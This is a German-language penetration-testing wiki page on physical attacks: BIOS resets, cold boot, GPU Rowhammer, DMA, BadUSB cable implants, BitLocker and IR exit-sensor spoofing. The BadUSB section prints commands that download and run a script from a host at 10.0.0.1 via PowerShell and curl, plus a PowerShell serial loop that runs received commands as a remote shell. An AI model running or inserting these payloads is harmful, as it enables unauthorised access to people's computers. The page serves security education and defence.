# Physische Angriffe

{{#include ../banners/hacktricks-training.md}}

Für die Erkennung von Schnittstellen auf Platinenebene, serielle Konsolen, Flash-Zugriff, Seitenkanäle und Glitching, siehe [Hardware Hacking](hardware-hacking/README.md) und die Kapitel zu den jeweiligen Schnittstellen. Diese Seite behandelt Angriffe, die physischen Zugriff auf das gesamte System erfordern.

## BIOS-Passwortwiederherstellung und Systemsicherheit

Die Firmware-Einstellungen älterer PCs lassen sich möglicherweise zurücksetzen, indem die CMOS-Batterie getrennt oder ein dokumentierter Clear-CMOS-Jumper verwendet wird. Die erforderliche Zeit ohne Stromversorgung hängt von der jeweiligen Platine ab. Moderne UEFI-Passwörter oder -Schlüssel können im nichtflüchtigen Flash-Speicher, in einem Embedded Controller oder in einem Sicherheitsgerät gespeichert sein und daher das Entfernen der Batterie überstehen. Konsultieren Sie das Handbuch der Platine bzw. des Servicebereichs, bevor Sie Pins kurzschließen; dieses Verfahren kann auch TPM-Messwerte ungültig machen und die Wiederherstellung der Festplattenverschlüsselung auslösen.

Auf älteren x86-Systemen können Tools wie **killCMOS** und **CmosPwd** CMOS-gesicherte Einstellungen in einer bootfähigen Umgebung untersuchen oder ändern. CmosPwd erkennt Passwortformate einer dokumentierten Auswahl älterer BIOS-Familien und kann den CMOS-Zustand sichern, wiederherstellen oder löschen. Die veröffentlichten Builds sind für ältere DOS-/Windows-, Linux-, FreeBSD- und NetBSD-Umgebungen vorgesehen.<sup>[[18]](#references)</sup> Diese Dienstprogramme sind keine universellen UEFI-Passwortentferner und erfordern ausreichenden Zugriff auf Hardware und Firmware.

Manche Laptop-Firmware zeigt nach mehreren fehlgeschlagenen Passwortversuchen einen herstellerspezifischen Challenge-Code an. Datenbanken wie [bios-pw.org](https://bios-pw.org) können für einige Modelle ältere Hersteller-Wiederherstellungspasswörter ableiten, aber viele Systeme implementieren eine Sperre ohne ableitbare Challenge. Behandeln Sie jedes generierte Passwort als modellspezifisch und vermeiden Sie es, permanente Versuchsbegrenzungen auszuschöpfen.

### UEFI-Sicherheit

Für moderne **UEFI**-Systeme kann CHIPSEC die Schutzmaßnahmen für Secure-Boot-Variablen prüfen. Beginnen Sie mit der Prüfung ohne Änderungen unten; der optionale Modus `-a modify` versucht absichtlich, Variablen zu beschädigen, und sollte nur auf einem wiederherstellbaren Laborsystem verwendet werden. CHIPSEC weist selbst darauf hin, dass sein privilegierter Treiber und der Hardwarezugriff auf niedriger Ebene für Produktionsendgeräte ungeeignet sind.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM-Analyse und Cold-Boot-Angriffe

DRAM verliert nicht sofort jedes Bit, wenn die Auffrischung stoppt. Die Zerfallsrate variiert je nach Modultechnologie und Temperatur erheblich; Kühlung kann nützliche Daten deutlich länger erhalten als ein ungekühlter Stromzyklus. Bei einem Cold-Boot-Angriff wird rasch in eine kleine Erfassungsumgebung neu gestartet oder ein gekühltes Modul übertragen, der Rohspeicher erfasst und trotz des Bitzerfalls werden kryptografische Schlüssel rekonstruiert. Ein Dienstprogramm zum Kopieren von Datenträgern ist nicht automatisch ein Tool zur Erfassung des physischen Speichers, und Volatility analysiert einen Dump, statt ihn zu erfassen. Verwende ein plattformgerechtes, validiertes Erfassungstool.<sup>[[12]](#references)</sup>

---

## GPU-Rowhammer-Angriffe auf Seitentabellen

Moderne GPU-Rowhammer-Angriffe sind deutlich nützlicher, wenn sie **GPU-Metadaten des virtuellen Speichers** statt gewöhnlicher Puffer zum Ziel haben. Neuere Untersuchungen zu **GDDR6-NVIDIA-Ampere-GPUs** zeigen, dass ein Angreifer mit nicht privilegiertem CUDA-Code GPU-spezifische Hammering-Muster erstellen, mithilfe von **Memory Massaging** Paging-Strukturen in anfälligen Zeilen platzieren und dann Bits in der **Seitentabelle der letzten Ebene** oder einem dazwischenliegenden **Seitenverzeichnis** kippen kann. Sobald ein einzelner Übersetzungseintrag beschädigt ist, kann der Angreifer **beliebige GPU-Speicher-Lese-/Schreibzugriffe** ermöglichen und anschließend zum Kompromittieren des Hosts übergehen.<sup>[[1]](#references)[[2]](#references)</sup>

### Angriffsmuster

1. **Hammerbare Zeilen** in GDDR6 ermitteln und refresh-bewusste/nicht einheitliche Hammering-Muster erstellen, die In-DRAM-Abwehrmaßnahmen umgehen.
2. **GPU-Zuweisungen so manipulieren**, dass der Treiber Seitenübersetzungsstrukturen an hammerbaren physischen Speicherorten platziert, statt sie im standardmäßig geschützten Pool zu belassen. In der Praxis kann dies bedeuten, den Bereich des niedrigen Speichers für Seitentabellen zu erschöpfen und große, spärlich belegte UVM-Zuordnungen mit kontrollierten Abständen zu verteilen.
3. **Übersetzungsmetadaten** wie **PFN**- oder aperturbezogene Bits in einem Seiten- oder Verzeichniseintrag kippen, sodass die vom Angreifer kontrollierte virtuelle Seite auf Seitentabellenseiten, beliebigen GPU-Speicher oder hostseitig sichtbare Systemzuordnungen verweist.
4. Die gefälschte Zuordnung wiederverwenden, um weitere Übersetzungseinträge umzuschreiben und **beliebige GPU-Speicher-Lese-/Schreibzugriffe** über GPU-Kontexte hinweg zu erlangen.

### Übergang zum Host und Gegenmaßnahmen

- Ist die **IOMMU deaktiviert**, können gefälschte Systemapertur-Zuordnungen beliebigen **physischen Host-Speicher** für die GPU zugänglich machen und so den GPU-Primitivzugriff zur vollständigen Kompromittierung des Hosts ausbauen.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** zielt auf Einträge der Seitentabelle der letzten Ebene, während **GeForge** zeigt, dass die Beschädigung einer Seitenverzeichnisebene einfacher sein kann, weil ein einzelner Bit-Flip einen größeren Übersetzungs-Teilbaum neu zuordnen kann. Betrachte nicht nur eine Paging-Ebene als sicherheitskritisch.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** ist weiterhin wichtig, da sie den direkten Zugriff auf beliebigen Host-Speicher verhindert, den GDDRHammer/GeForge nutzen. Sie ist jedoch **keine vollständige Gegenmaßnahme**. **GPUBreach** zeigt einen zweistufigen Übergang: Der Angreifer beschädigt vom GPU-Schreibzugriff erreichbare, dem Treiber gehörende CPU-Puffer und löst dann Speicherfehler im NVIDIA-Treiber aus, um selbst bei aktivierter IOMMU einen Kernel-Schreibzugriff und eine **Root-Shell** zu erlangen.<sup>[[3]](#references)</sup>
- **Systemseitiges ECC** ist eine praktikable Härtungsmaßnahme auf unterstützten Workstation-/Server-GPUs. Consumer-GPUs ohne ECC bieten eine schwächere Abwehrfläche.<sup>[[4]](#references)</sup>
- Diese Angriffe sind nicht rein theoretisch: **GeForge** meldete **1.171** Bit-Flips auf einer RTX 3060 und **202** auf einer RTX A6000 – genug, um eine funktionierende Angriffskette zur Rechteausweitung auf dem Host aufzubauen.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA)-Angriffe

Informationen zum Offline-Patching von UEFI IFR/NVRAM, mit dem sich die IOMMU-Durchsetzung vor dem Booten herabstufen und eine Windows-DMA-Angriffskette ermöglichen lässt, findest du hier:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstriert die **DMA-basierte Speichererfassung und -manipulation** über Schnittstellen wie FireWire und frühe Thunderbolt-Konfigurationen, einschließlich historischer Signaturen zur Umgehung der Anmeldung. Es ist nicht einfach „gegen Windows 10 wirkungslos“: Die Ausnutzbarkeit hängt von der Schnittstelle, dem Ziel-Build, der IOMMU-Richtlinie, dem Sperrstatus und davon ab, ob Windows Kernel DMA Protection unterstützt und aktiviert ist. Windows 10 Version 1803 und höher führte Kernel DMA Protection auf kompatiblen Plattformen ein und veränderte damit die Angriffsfläche erheblich.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Zugriff auf das System über Live-CD/USB

Auf einem unverschlüsselten oder bereits entsperrten Windows-Volume kann eine Offline-Umgebung Barrierefreiheitsprogramme wie **sethc.exe** oder **Utilman.exe** durch **cmd.exe** ersetzen. Wird dann die entsprechende Tastenkombination auf dem Anmeldebildschirm gedrückt, erscheint eine SYSTEM-Eingabeaufforderung. Tools wie **chntpw** können lokale SAM-Kontodaten bearbeiten. Diese Methoden umgehen kein gesperrtes BitLocker-Volume und können mit DPAPI/EFS geschützte Anmeldedaten beschädigen. Sichere forensische Kopien und Backups.

**Kon-Boot** ist ein kommerzielles Tool zur Umgehung der Authentifizierung beim Booten für unterstützte Windows-/macOS-Konfigurationen. Die Kompatibilität hängt von Betriebssystem, Firmwaremodus, Secure Boot und Datenträgerverschlüsselung ab; ein gesperrtes BitLocker-Volume wird damit nicht entschlüsselt.<sup>[[10]](#references)</sup>

---

## Umgang mit Windows-Sicherheitsfunktionen

### Boot- und Wiederherstellungs-Tastenkombinationen

- **Entf/Supr**, F2, F10 oder eine andere Herstellertaste kann das Firmware-Setup öffnen.
- **F8** öffnet die erweiterten Windows-Startoptionen nur bei Konfigurationen, in denen dieser ältere Pfad noch aktiviert ist; der aktuelle Zugriff auf die Wiederherstellungsumgebung variiert.
- Wenn **Shift** gedrückt gehalten wird, kann die automatische Windows-Anmeldung in manchen Konfigurationen unterdrückt werden. Richtlinien- oder Registrierungseinstellungen können dieses Verhalten jedoch deaktivieren.<sup>[[17]](#references)</sup>

### BAD USB-Geräte

Geräte wie **USB Rubber Ducky** und Teensy-Boards können sich als vertrauenswürdige HID-Tastaturen anmelden und vorgegebene Tastenanschläge einspeisen. Die Payload hat zunächst die Berechtigungen und den Desktopzugriff der angemeldeten Sitzung; UAC-Eingabeaufforderungen, Bildschirmsperre, Tastaturlayout, Timing und USB-Richtlinien für Endgeräte schränken sie weiterhin ein.<sup>[[15]](#references)</sup>

Programmierbare Peripheriegeräte können außerdem Host-Kernel-Parser angreifen und mehrere USB-Geräte für Heap Grooming und die Offenlegung von Informationen koordinieren:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

### Volume Shadow Copy

Mit Administrator- oder Backup-Berechtigungen kann eine Schattenkopie erstellt oder können Registry-Hives gespeichert werden, um gesperrte Dateien wie **SAM** und **SYSTEM** zu erfassen. Dies ist eine Technik zur Sammlung nach einer Kompromittierung, keine Umgehung von Berechtigungen. Entsprechende Ereignisse sollten mit `diskshadow`/VSS und dem Export von Registry-Hives korreliert werden.

## BadUSB-/HID-Implantat-Techniken

### NFC-ausgelöstes Android-HID-Gadget

Ein gerootetes Android-Telefon kann nur dann zu einer programmierbaren USB-Tastatur werden, wenn USB-Controller und Kernel **USB-Gadget-/HID-Unterstützung** bieten. Auf kompatiblen Geräten stellt Kali NetHunter über **USB Arsenal** Gadget-Profile bereit. Eine weitere Option ist [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), das ConfigFS-Gadget-Funktionen erstellt und Tastatur-/Maus-Zeichengeräte wie `/dev/hidg0` und `/dev/hidg1` bereitstellen kann. Das Tool erstellt lediglich den Gadget-Endpunkt; ein separater Prozess muss HID-Berichte an ihn schreiben. Root-Zugriff kann einen Kernel ohne ConfigFS, HID-Gadget-Unterstützung oder einen nutzbaren USB Device Controller nicht ersetzen.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Dieser Endpunkt lässt sich mit Android-NFC als physischem Auslöser kombinieren. Die App [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) liest eine Tag-UID, wandelt sie in die erwartete Darstellung um, prüft sie anhand einer lokalen Positivliste und sendet bei Übereinstimmung eine konfigurierte Tastensequenz im Rubber-Ducky-Stil. Der angeschlossene Host sieht gewöhnliche Tastatureingaben und benötigt keine NFC-Software.<sup>[[22]](#references)[[24]](#references)</sup>

Prüfe die Geräteerkennung und das Tastaturlayout in einem leeren Texteditor, bevor du Tastenkombinationen oder Befehle verwendest. Eine harmlose Payload lautet:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Wichtige Vertrauensgrenzen:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- Eine **UID-Whitelist dient der Identifikation, nicht der Authentifizierung**. UIDs sind öffentlich, und einige Token-Typen oder Emulatoren ermöglichen Klonen oder Vortäuschen. Eine kopierte, zugelassene UID durchläuft denselben Dispatch-Pfad wie das Originaltoken.
- Das **NfcScreenOff**-Magisk-Modul patcht den NFC-Dienst, sodass dieser sich verhält, als wäre der Bildschirm eingeschaltet und entsperrt. Ist das Telefon bereits mit einem Host verbunden, kann dadurch jemand die Payload auslösen, ohne das Telefon zu entsperren.
- Im Payload gespeicherte Passwörter, API-Tokens und Befehle sind Geheimnisse, die sich auf einem gerooteten Gerät oder einem Gerät mit entsperrtem Bootloader wiederherstellen lassen. Ein Passwort über HID einzutippen ist die Automatisierung der Wiederverwendung eines Passworts, keine passwortlose Authentifizierung.
- HID-Injection nutzt die Berechtigungen des aktiven Desktops und hängt von Fokus, Timing und Tastaturlayout des Hosts ab. Verlange vor dem Ausführen sensibler Aktionen eine aktuelle Bestätigung durch den Nutzer, vermeide privilegierte Geheimnisse in Skripten und verwende für echte Authentifizierung einen kryptografischen Challenge-Response-Authenticator.

### Wi-Fi-gesteuerte Kabel-Implantate

- ESP32-S3-basierte Implantate wie **Evil Crow Cable Wind** verbergen sich in USB-A→USB-C- oder USB-C↔USB-C-Kabeln, werden ausschließlich als USB-Tastatur erkannt und stellen ihren C2-Stack über Wi-Fi bereit. Der Angreifer muss das Kabel lediglich über den Host des Opfers mit Strom versorgen, einen Hotspot mit dem Namen `Evil Crow Cable Wind` und dem Passwort `123456789` einrichten und [http://cable-wind.local/](http://cable-wind.local/) (oder dessen DHCP-Adresse) aufrufen, um die eingebettete HTTP-Schnittstelle zu erreichen.<sup>[[8]](#references)</sup>
- Die Browser-Oberfläche bietet Tabs für *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* und *Config*. Gespeicherte Payloads sind nach Betriebssystem gekennzeichnet, Tastaturlayouts lassen sich während des Betriebs wechseln und VID/PID-Zeichenfolgen können geändert werden, um bekannte Peripheriegeräte nachzuahmen.
- Da sich der C2 im Kabel befindet, kann ein Telefon Payloads bereitstellen, deren Ausführung auslösen und Wi-Fi-Zugangsdaten verwalten, ohne das Netzwerk der Organisation zu verwenden – nützlich bei physischen Eindringversuchen mit kurzer Verweildauer.

### Betriebssystembewusste AutoExec-Payloads

- AutoExec-Regeln verknüpfen eine oder mehrere Payloads, die unmittelbar nach der USB-Erkennung ausgeführt werden. Das Implantat führt eine einfache Betriebssystemerkennung durch und wählt das passende Skript aus.
- Beispielablauf:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) oder `CTRL ALT T` (Terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Da die Ausführung unbeaufsichtigt erfolgt, kann bereits der Austausch eines Ladekabels „plug-and-pwn“-Erstzugriff im Kontext des angemeldeten Benutzers ermöglichen.

### HID-gestartete Remote Shell über Wi-Fi-TCP

1. **Tastatureingabe-Bootstrap:** Eine gespeicherte Payload öffnet eine Konsole und fügt eine Schleife ein, die alles ausführt, was über das neue USB-Serial-Gerät eingeht. Eine minimale Windows-Variante ist:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Kabelbrücke:** Das Implantat hält den USB-CDC-Kanal offen, während sein ESP32-S3 einen TCP-Client (Python-Skript, Android-APK oder Desktop-Executable) zum Operator startet. Alle in die TCP-Sitzung eingegebenen Bytes werden in die obige serielle Schleife weitergeleitet. So ist auch auf air-gapped Hosts die Remote-Befehlsausführung möglich. Die Ausgabe ist begrenzt, daher führen Operatoren typischerweise Befehle blind aus (Konten erstellen, zusätzliche Tools bereitstellen usw.).

### HTTP-OTA-Update-Angriffsfläche

- Die dokumentierte Evil-Crow-Cable-Wind-Schnittstelle stellt einen nicht authentifizierten Firmware-Update-Endpunkt unter `/update` bereit:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Field-Operatoren können Funktionen während eines Einsatzes im laufenden Betrieb austauschen (z. B. USB Army Knife-Firmware flashen), ohne das Kabel zu öffnen. So kann das Implantat auf neue Fähigkeiten umschalten, während es weiterhin mit dem Zielhost verbunden ist.

## BitLocker-Verschlüsselung umgehen

Eine autorisierte forensische Erfassung eines laufenden oder kürzlich ausgeführten Systems kann einen BitLocker-Volume-Master-Key oder verwandtes Schlüsselmaterial enthalten, solange das Volume entsperrt ist. Kommerzielle Tools wie Elcomsoft Forensic Disk Decryptor und Passware Kit Forensic können unterstützte Speicherabbilder, Ruhezustandsdateien oder Crash-Dumps durchsuchen; ein Erfolg ist jedoch nicht garantiert. Moderne Windows-Versionen verschlüsseln Crash-Dumps ebenfalls, wenn BitLocker aktiviert ist. Ein gespeichertes 48-stelliges Wiederherstellungspasswort ist ein anderes Artefakt als ein In-Memory-Volume-Key.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering zum Hinzufügen eines Wiederherstellungsschlüssels

Ein Angreifer, der einen Administrator dazu bringt, BitLocker-Verwaltungsbefehle auszuführen, kann einen Wiederherstellungspasswort-, externen Schlüssel- oder anderen Protector hinzufügen und ihn anschließend abfangen. Ein Wiederherstellungspasswort kann keine beliebige Folge von Nullen sein: Numerische BitLocker-Wiederherstellungspasswörter müssen einem validierten 48-stelligen Format entsprechen. Die relevante Syntax für die autorisierte Administration lautet `manage-bde -protectors -add C: -recoverypassword`; die hinzugefügten Protectors lassen sich mit `manage-bde -protectors -get C:` auflisten. Überwachen Sie das Hinzufügen von Protectors und stellen Sie sicher, dass neues Wiederherstellungsmaterial nur an genehmigten Orten hinterlegt wird.<sup>[[16]](#references)</sup>

---

## Ausnutzen von Gehäuseöffnungs-/Wartungsschaltern zum Zurücksetzen des BIOS auf Werkseinstellungen

Viele moderne Laptops und Desktop-PCs im Small-Form-Factor-Format verfügen über einen **Gehäuseöffnungsschalter**, der vom Embedded Controller (EC) und der BIOS-/UEFI-Firmware überwacht wird. Der Schalter dient in erster Linie dazu, beim Öffnen eines Geräts einen Alarm auszulösen. Manche Hersteller implementieren jedoch eine **undokumentierte Wiederherstellungsfunktion**, die durch ein bestimmtes Schaltmuster ausgelöst wird.<sup>[[5]](#references)[[6]](#references)</sup>

### So funktioniert der Angriff

1. Der Schalter ist mit einem **GPIO-Interrupt** am EC verbunden.
2. Auf dem EC laufende Firmware erfasst **Zeitpunkt und Anzahl der Betätigungen**.
3. Wird ein fest codiertes Muster erkannt, ruft der EC eine *mainboard-reset*-Routine auf, die **den Inhalt des System-NVRAM/CMOS löscht**.
4. Beim nächsten Start laden betroffene Modelle einen zurückgesetzten Firmware-Zustand. Je nach Hersteller und Revision können dazu ein Supervisor-Passwort, benutzerdefinierte Starteinstellungen oder registrierte Secure-Boot-Schlüssel gehören. Auswirkungen auf den TPM-Zustand und die Festplattenverschlüsselung müssen separat bewertet werden.

> Ein Firmware-Reset kann externe Boot-Optionen wiederherstellen, entschlüsselt jedoch **keinen** Speicher. BitLocker oder ein anderes System zur vollständigen Festplattenverschlüsselung kann nach Änderungen am TPM oder an der Firmware die Wiederherstellung anfordern und das interne Laufwerk weiterhin ohne Wiederherstellungsschlüssel schützen.<sup>[[16]](#references)</sup>

### Beispiel aus der Praxis – Framework 13 Laptop

Die Wiederherstellungsfunktion für das Framework 13 (11./12./13. Generation) lautet:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Nach dem zehnten Zyklus setzt der EC ein Flag, das das BIOS anweist, beim nächsten Neustart den NVRAM zu löschen. Der gesamte Vorgang dauert ~40 s und erfordert **nichts außer einem Schraubendreher**.<sup>[[5]](#references)</sup>

### Allgemeines Exploit-Verfahren

1. Das Zielgerät einschalten oder aus dem Ruhezustand fortsetzen, damit der EC läuft.
2. Die Bodenabdeckung entfernen, um den Intrusion-/Wartungsschalter freizulegen.
3. Das herstellerspezifische Umschaltmuster reproduzieren (Dokumentation und Foren konsultieren oder die EC-Firmware reverse-engineeren).
4. Das Gerät wieder zusammenbauen und neu starten. Anschließend prüfen, welche Firmware-Einstellungen und Zugangsdaten tatsächlich geändert wurden.
5. Falls autorisiert und externes Booten möglich ist, ein kontrolliertes Live-Image starten. Sobald ein internes Volume rechtmäßig entsperrt wurde (oder nie verschlüsselt war), kann die Live-Umgebung Zugangsdaten und Daten erfassen oder die EFI-Systempartition untersuchen. Änderungen an dieser Partition zur Installation eines EFI-Implants sind dauerhaft und äußerst invasiv und bleiben durch Secure Boot, Measured Boot, Firmware-Schreibschutz und Endpoint-Monitoring eingeschränkt. Auf verschlüsselten Speicher kann ohne Schlüssel oder Wiederherstellungsmaterial nicht zugegriffen werden.

### Erkennung & Abwehr

* Gehäuseöffnungsereignisse in der OS-Verwaltungskonsole protokollieren und mit unerwarteten BIOS-Resets korrelieren.
* **Manipulationssichere Siegel** an Schrauben und Abdeckungen anbringen, um ein Öffnen zu erkennen.
* Geräte in **physisch kontrollierten Bereichen** aufbewahren; davon ausgehen, dass physischer Zugriff einer vollständigen Kompromittierung gleichkommt.
* Falls verfügbar, die Funktion „Wartungsschalter-Reset“ des Herstellers deaktivieren oder für NVRAM-Resets eine zusätzliche kryptografische Autorisierung verlangen.

---

## Verdeckte IR-Injektion gegen berührungslose Ausgangssensoren

### Sensoreigenschaften
- Gängige „Wave-to-Exit“-Sensoren kombinieren einen Nahinfrarot-LED-Emitter mit einem Empfängermodul wie in einer TV-Fernbedienung, das erst dann ein High-Signal ausgibt, wenn es mehrere Impulse (~4–10) mit dem korrekten Träger (≈30 kHz) erkannt hat.<sup>[[7]](#references)</sup>
- Eine Kunststoffabdeckung verhindert, dass Emitter und Empfänger direkt aufeinander ausgerichtet sind. Daher geht der Controller davon aus, dass jedes erkannte Trägersignal von einer nahen Reflexion stammt, und steuert ein Relais an, das den Türöffner betätigt.
- Sobald der Controller davon ausgeht, dass sich ein Ziel in der Nähe befindet, ändert er häufig die Modulationshüllkurve der Aussendung. Der Empfänger akzeptiert jedoch weiterhin jeden Impuls, der zum gefilterten Trägersignal passt.

### Angriffsablauf
1. **Aussendungsprofil erfassen** – einen Logikanalysator an die Controller-Pins anschließen, um sowohl die Wellenformen vor als auch nach der Erkennung aufzuzeichnen, die die interne IR-LED ansteuern.
2. **Nur die Wellenform „nach der Erkennung“ wiedergeben** – den Original-Emitter entfernen oder ignorieren und eine externe IR-LED von Anfang an mit dem bereits ausgelösten Muster ansteuern. Da für den Empfänger nur Impulszahl und Frequenz entscheidend sind, behandelt er das gefälschte Trägersignal wie eine echte Reflexion und aktiviert die Relaisleitung.
3. **Die Übertragung takten** – das Trägersignal in abgestimmten Impulsfolgen senden (z. B. Dutzende Millisekunden ein, ähnlich lange aus), um die Mindestimpulszahl zu erreichen, ohne die AGC oder die Störungslogik des Empfängers zu überlasten. Eine dauerhafte Aussendung macht den Sensor schnell unempfindlich und verhindert das Auslösen des Relais.

### Reflektive Injektion über große Distanz
- Wird die Labor-LED durch eine leistungsstarke IR-Diode, einen MOSFET-Treiber und fokussierende Optik ersetzt, ist ein zuverlässiges Auslösen aus ~6 m Entfernung möglich.
- Der Angreifer benötigt keine direkte Sichtverbindung zur Empfängeröffnung. Wird der Strahl auf Innenwände, Regale oder Türrahmen gerichtet, die durch Glas sichtbar sind, kann reflektierte Energie in das Sichtfeld von ~30° gelangen und eine Handbewegung aus kurzer Entfernung nachahmen.
- Da die Empfänger nur schwache Reflexionen erwarten, kann ein deutlich stärkerer externer Strahl von mehreren Flächen reflektiert werden und trotzdem über der Erkennungsschwelle bleiben.

### Bewaffnete Angriffs-Taschenlampe
- Wird der Treiber in eine handelsübliche Taschenlampe eingebaut, bleibt das Werkzeug unauffällig. Die sichtbare LED durch eine leistungsstarke IR-LED ersetzen, die auf das Frequenzband des Empfängers abgestimmt ist, einen ATtiny412 (oder Ähnliches) zur Erzeugung der ≈30 kHz-Impulse hinzufügen und den LED-Strom über einen MOSFET ableiten.
- Eine Teleskop-Zoomlinse bündelt den Strahl für größere Reichweite und höhere Präzision. Ein vom MCU gesteuerter Vibrationsmotor gibt eine haptische Rückmeldung, wenn die Modulation aktiv ist, ohne sichtbares Licht auszusenden.
- Durch das Durchschalten mehrerer gespeicherter Modulationsmuster (leicht unterschiedliche Trägerfrequenzen und Hüllkurven) erhöht sich die Kompatibilität mit umgelabelten Sensorfamilien. So kann der Bediener reflektierende Flächen absuchen, bis das Relais hörbar klickt und die Tür entriegelt.

---

## References

- [1] [GDDRHammer: DRAM-Zeilen massiv stören — Rowhammer-Angriffe über Komponenten hinweg mit modernen GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: GDDR-Speicher hämmern, um GPU-Seitentabellen zum Spaß und Profit zu fälschen](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilegieneskalationsangriffe auf GPUs mittels Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA – Sicherheitshinweis: Rowhammer – Juli 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – „Framework 13. Hier drücken, um zu pwnen“](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Anleitung zum Zurücksetzen des Mainboards](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – „Neeeein, nicht berühren! – Umgehung berührungsloser IR-Ausgangssensoren mit einer verdeckten IR-Taschenlampe“](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – „Einstecken, starten, pwnen: Hacking mit Evil Crow Cable Wind“](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier – Rowhammer-Angriff auf NVIDIA-Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Offizielle Dokumentation und Kompatibilitätsinformationen zu Kon-Boot](https://kon-boot.com/)
- [11] [CHIPSEC-Dokumentation – Secure-Boot-Variablenschutz](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Damit wir nicht vergessen: Cold-Boot-Angriffe auf Verschlüsselungsschlüssel](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception – Manipulation des physischen Speichers über DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn – Kernel-DMA-Schutz](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Dokumentation zu Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn – Leitfaden zu BitLocker-Vorgängen](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn – Verhalten beim Gedrückthalten der Umschalttaste und bei der automatischen Anmeldung](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity – Dokumentation und Downloads zu CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali-Linux-Dokumentation – NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux-Kernel-Dokumentation – USB-HID-Gadget-Treiber](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB-Gadget-Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Ein gerootetes Android-Telefon in einen NFC-Authenticator und ein Automatisierungstool für den PC verwandeln](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
